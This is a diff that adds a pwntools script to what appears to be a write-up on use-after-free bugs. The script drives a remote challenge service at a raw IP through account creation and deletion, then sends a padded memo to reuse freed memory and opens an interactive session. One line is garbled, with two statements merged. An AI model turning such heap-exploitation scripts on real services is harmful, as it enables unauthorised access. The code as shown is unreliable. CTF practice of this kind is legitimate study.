@@ -27,3 +27,32 @@ For example, to exploit the UAF vulnerability checkm8 in some iOS devices an att
 ```assembly
 
 ```
+exploit
+```python
+from pwn import *
+from time import sleepp = remote("178.128.160.242",32219)
+p.recvline("Please enter an operation number:")
+sleep(1)
+p.sendline("1")
+sleep(1)
+p.recvline("First name:")
+p.sendline("")
+sleep(1)
+p.recvline("Last name:")
+p.sendline("")
+sleep(1)
+p.recvline("Please enter an operation number:")
+p.sendline("3")
+p.recvline("Account deleted successfully")
+sleep(1)
+p.recvline("Please enter an operation number:")
+p.sendline("5")
+sleep(1)
+p.recvline("Please enter memo:")
+p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfuck")
+p.recvline("Thank you, please keep this reference number number safe:")
+sleep(1)
+p.recvline("Please enter an operation number:")
+p.sendline("5")
+p.interactive()
+```
